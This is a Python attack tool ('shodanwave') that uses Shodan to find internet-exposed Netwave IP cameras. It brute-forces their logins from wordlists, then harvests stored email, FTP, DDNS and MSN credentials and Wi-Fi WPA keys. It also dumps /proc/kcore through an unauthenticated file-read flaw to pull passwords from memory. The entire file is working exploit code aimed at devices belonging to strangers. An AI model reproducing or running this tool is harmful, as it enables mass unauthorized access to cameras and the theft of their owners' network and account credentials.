#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import time
import subprocess
import signal

figlet_header = """
     _               _
    | |             | |
 ___| |__   ___   __| | __ _ _ ____      ____ ___   _____
/ __| '_ \ / _ \ / _` |/ _` | '_ \ \ /\ / / _` \ \ / / _ \\
\__ \ | | | (_) | (_| | (_| | | | \ V  V / (_| |\ V /  __/
|___/_| |_|\___/ \__,_|\__,_|_| |_|\_/\_/ \__,_| \_/ \___|
"""

try:
    import shodan
    import requests
    import tailer
    from colored import attr, fg, stylize
except ImportError as e:
    print("Error: {} \n".format(e))
    print("Try this ... `pip install -r requirements.txt`")


def print_fg_red(s, attr=None):
    print(stylize(s, fg("red")))


def print_fg_yellow(s):
    print(stylize(s, fg("yellow")))


def print_fg_green(s, attr=None):
    print(stylize(s, fg("green"), attr))


def main():
    print_fg_yellow("{}".format(figlet_header))
    print_fg_red("This tool is successfully connected to shodan service")

    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-s',
        '--search',
        dest='search',
        default='Netwave IP Camera',
        type=str,
        help='Default Netwave IP Camera')
    parser.add_argument(
        '-u',
        '--username',
        dest="username",
        type=argparse.FileType('r'),
        help='Select your usernames wordlist')
    parser.add_argument(
        '-w',
        '--wordlist',
        dest="password",
        type=argparse.FileType('r'),
        help='Select your passwords wordlist')
    parser.add_argument(
        '-k',
        '--shodan',
        dest="address",
        default='',
        type=str,
        help='Shodan API key')
    parser.add_argument(
        '-t', '--output', dest="output", default='', type=str, help='Log File')
    parser.add_argument(
        '-l',
        '--limit',
        dest="limit",
        type=str,
        help='Limit the number of registers responsed by Shodan')
    parser.add_argument(
        '-o',
        '--offset',
        dest="offset",
        type=str,
        help='Shodan skips this number of registers from response')

    args = parser.parse_args()

    global filename
    filename = args.output

    try:

        if sys.argv[2] == "-h" or sys.argv[2] == "--help":
            # print "Usage: python shodanwave.py --help"
            sys.exit(0)
    except Exception as e:
        print("Usage: python shodanwave.py --help")
        sys.exit(0)

    def signal_handler(signal, frame):
        print('\nclearing up..')
        os.system("rm -rf tmpstream.txt")
        os.system("rm -rf tmpstrings.out")
        os.system("killall -9 wget")
        os.system("killall -9 tail")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    def NetworkSearchosts():

        exploit = True
        found = False

        macaddr = ""
        email_user = ''
        email_pwd = ''

        ftp_user = ''
        ftp_pwd = ''
        ftp_svr = ''
        ftp_port = ''

        ddns_user = ''
        ddns_pwd = ''
        ddns_host = ''
        ddns_proxy_svr = ''

        msn_user = ''
        msn_pwd = ''

        try:

            shodanapi = shodan.Shodan(args.address)
            api = shodanapi.search(
                args.search, limit=args.limit, offset=args.offset)
            total = api.get('total')

            print_fg_green("[+] Shodan successfully Connected.")
            print_fg_green("[+] Netwave Exploit Enabled.")
            print_fg_green("[+] Netwave IP Camera Found: {}".format(total))
            usernames = []

            if args.username or args.password:
                usernames = args.username.readlines()
                passwords = args.password.readlines()

                print_fg_green("[+] Passwords loaded: {}".format(
                    len(passwords)))
                pass

            ShodanModuleExploit = input(
                stylize("[!] Disable password discovery module? (Yes/no): ",
                        fg("yellow")))

            if ShodanModuleExploit.upper(
            ) == "YES" or ShodanModuleExploit.upper() == "Y":
                print_fg_red("[-] Netwave exploit disabled.")
                exploit = False

            while True:

                for hosts in api['matches']:

                    host = hosts.get('ip_str')
                    port = hosts.get('port')
                    city = hosts['location']['city'] or 'n/a'
                    country = hosts['location']['country_name'] or 'n/a'
                    org = hosts.get('org', 'n/a')
                    hostnames = hosts.get('hostnames', 'n/a')
                    product = hosts.get('product', 'n/a')

                    try:

                        path = "snapshot.cgi"
                        url = "http://{}:{}/{}".format(host, port, path)

                        print("[+] Launching brute force on host http://{}:{}".
                              format(host, port))
                        for administrator in usernames:
                            administrator = administrator.strip()
                            for password in passwords:

                                password = password.strip()

                                headers = {
                                    'User-Agent':
                                    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
                                }

                                request = requests.get(
                                    url,
                                    auth=(administrator, password),
                                    headers=headers,
                                    timeout=0.3)

                                status = request.status_code

                                if status == 200:

                                    exploit = False
                                    found = True

                                    print_fg_green(
                                        "[+] Password Found {}@{}".format(
                                            administrator, password),
                                        attr("bold"))
                                    print_fg_yellow(
                                        "[!] Trying to get more information")

                                    try:

                                        url = "http://{}:{}/get_params.cgi".format(
                                            host, port)

                                        headers = {
                                            'User-Agent':
                                            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
                                        }

                                        request = requests.get(
                                            url,
                                            headers=headers,
                                            auth=(administrator, password),
                                            timeout=0.3)

                                        response = request.text.split(";\n")

                                        if status == 200:
                                            for content in response:
                                                if content.startswith(
                                                        "var mail_user="):
                                                    content = content.split(
                                                        "'")
                                                    email_user = content[1]
                                                elif content.startswith(
                                                        "var mail_pwd="):
                                                    content = content.split(
                                                        "'")
                                                    email_pwd = content[1]
                                                elif content.startswith(
                                                        "var ddns_user="):
                                                    content = content.split(
                                                        "'")
                                                    ddns_user = content[1]
                                                elif content.startswith(
                                                        "var ddns_pwd="):
                                                    content = content.split(
                                                        "'")
                                                    ddns_pwd = content[1]
                                                elif content.startswith(
                                                        "var ddns_host="):
                                                    content = content.split(
                                                        "'")
                                                    ddns_host = content[1]
                                                elif content.startswith(
                                                        "var ddns_proxy_svr="):
                                                    content = content.split(
                                                        "'")
                                                    ddns_proxy_svr = content[1]
                                                elif content.startswith(
                                                        "var ftp_svr="):
                                                    content = content.split(
                                                        "'")
                                                    ftp_svr = content[1]
                                                elif content.startswith(
                                                        "var ftp_port="):
                                                    content = content.split(
                                                        "=")
                                                    ftp_port = content[1]
                                                elif content.startswith(
                                                        "var ftp_user="):
                                                    content = content.split(
                                                        "'")
                                                    ftp_user = content[1]
                                                elif content.startswith(
                                                        "var ftp_pwd="):
                                                    content = content.split(
                                                        "'")
                                                    ftp_pwd = content[1]
                                                elif content.startswith(
                                                        "var msn_user="):
                                                    content = content.split(
                                                        "'")
                                                    msn_user = content[1]
                                                elif content.startswith(
                                                        "var msn_pwd="):
                                                    content = content.split(
                                                        "'")
                                                    msn_pwd = content[1]
                                            if not (email_user == ''):
                                                print_fg_green(
                                                    "[+] Email: {}:{}".format(
                                                        email_user, email_pwd))
                                            if not (ftp_user == ''):
                                                print_fg_green(
                                                    "[+] FTP: ftp://{}:{}@{}:{}".
                                                    format(
                                                        ftp_user, ftp_pwd,
                                                        ftp_svr, ftp_port))
                                            if not (ddns_user == ''):
                                                print_fg_green(
                                                    "[+] DNS: http://{}:{}@{}:{}".
                                                    format(
                                                        ddns_user, ddns_pwd,
                                                        ddns_host,
                                                        ddns_proxy_svr))
                                            if not (msn_user == ''):
                                                print_fg_green(
                                                    "[+] MSN: {}@{}".format(
                                                        msn_user, msn_pwd))
                                    except Exception as e:
                                        print_fg_red(
                                            "[-] {} not found ".format(url))
                                    break
                                else:
                                    found = False
                                    if ShodanModuleExploit.upper(
                                    ) == "YES" or ShodanModuleExploit.upper(
                                    ) == "Y":
                                        exploit = False
                                    else:
                                        exploit = True

                        if not (found):
                            if ShodanModuleExploit.upper(
                            ) == "YES" or ShodanModuleExploit.upper() == "Y":
                                exploit = False
                            else:
                                exploit = True
                                print_fg_red("[!] Password not found",
                                             attr("bold"))
                    except Exception as e:
                        print(e)
                        print_fg_red("[-] {} not found".format(url))

                    print_fg_yellow("[!] Getting System Information")
                    print_fg_yellow("[!] Getting Wireless System Information")

                    try:
                        wireless = "http://{}:{}/get_status.cgi".format(
                            host, port)
                        headers = {
                            'User-Agent':
                            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
                        }

                        response = requests.get(
                            wireless, headers=headers, timeout=0.3)
                        status = response.status_code
                        content = response.text.split(';\n')

                        if status == 200:
                            for macaddress in content:
                                if macaddress.startswith("var id="):
                                    macaddress = macaddress.split("'")
                                    macaddr = macaddress[1]

                                    print_fg_yellow(
                                        "[+] Mac address found {}".format(
                                            macaddr))

                        else:
                            print_fg_red("[-] Getting mac address")
                    except Exception as e:
                        print_fg_red("[-] {} not found".format(wireless))

                    print(
                        """[+] Host: http://{}:{}\n[+] Country: {}\n[+] City: {}\n[+] Organization: {}\n[+] Product: {}""".
                        format(host, port, country, city, org, product))

                    log(host, port, country, city, org, product)

                    try:
                        url = "http://{}:{}//etc/RT2870STA.dat".format(
                            host, port)

                        headers = {
                            'User-Agent':
                            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
                        }

                        response = requests.get(
                            url, headers=headers, timeout=0.3)
                        content = response.text.split("\n")

                        status = response.status_code

                        if status == 200:
                            for crendential in content:
                                if crendential.find(
                                        "WPAPSK") != -1 or crendential.find(
                                            "SSID") != -1:
                                    crendential = crendential.replace(
                                        "=", ": ")
                                    print_fg_green(
                                        "[+] {}".format(crendential),
                                        attr("bold"))
                        else:
                            print_fg_red("[!] Wireless lan is disabled..",
                                         attr("bold"))
                    except Exception as e:
                        print_fg_red("[!] Error: Wireless lan is disabled..")

                    try:
                        url = "http://{}:{}//proc/kcore".format(host, port)
                        done = 0
                        linecount = 0

                        if exploit:
                            print_fg_red(
                                "[+] Starting to read memory dump.. this could take a few minutes"
                            )
                            proc = subprocess.Popen(
                                "wget -qO- " + url + " >> tmpstream.txt",
                                shell=True,
                                preexec_fn=os.setsid)
                            os.system('echo "" > tmpstrings.out')
                            time.sleep(1)
                            proc2 = subprocess.Popen(
                                "tail -f tmpstream.txt | strings >>tmpstrings.out",
                                shell=True,
                                preexec_fn=os.setsid)
                            print_fg_red("[+] CTRL+C to exit..", attr("bold"))

                            while 1:
                                sys.stdout.flush()
                                if os.stat('tmpstrings.out').st_size <= 1024:
                                    sys.stdout.write(
                                        stylize("binary data: " + str(
                                            os.stat('tmpstream.txt').st_size) +
                                                "\r", fg("green")))
                                else:
                                    sys.stdout.flush()
                                    print(
                                        "[+] Strings in binary data found.. password should be around line 10000"
                                    )
                                    for line in tailer.follow(
                                            open('tmpstrings.out', 'r')):
                                        if done == 0:
                                            linecount += 1
                                            if line == macaddr:
                                                sys.stdout.flush()
                                                done = 1
                                                print_fg_green(
                                                    "[+] Mac address triggered.. printing the following dumps, could leak username and passwords.."
                                                )
                                            else:
                                                sys.stdout.write(
                                                    str(linecount) + "\r")
                                        elif done == 1:
                                            done = 2
                                            print_fg_green(
                                                "[+] Firstline.. {}".format(
                                                    line))
                                        elif done == 2:
                                            done = 3
                                            print_fg_green(
                                                "[+] Possible username: {}".
                                                format(line))
                                        elif done == 3:
                                            done = 4
                                            print_fg_green(
                                                "[+] Possible password: {}".
                                                format(line))
                                        elif done == 4:
                                            done = 0
                                            print_fg_green(
                                                "[+] Following line..\n\n{}".
                                                format(line))
                                        else:
                                            pass
                            signal.pause()
                    except:
                        print_fg_red(
                            "[-] Victim isn't vulnerable to memory leak, exiting.."
                        )
                print_fg_green("[+] Done!")
                return True
        except shodan.APIError as e:
            print_fg_red("[-] Error: {}".format(e))
            sys.exit(0)

    NetworkSearchosts()


def log(host, port, country, city, org, product):
    with open(filename, "w+") as f:
        out = "[+] Host: http://{}:{}\n[+] Country: {}\n[+] City: {}\n[+] Organization: {}\n[+] Product: {}\n ".format(
            host, port, country, city, org, product)
        f.write(out)
        f.write("*****************" + "\n")


if __name__ == "__main__":
    main()
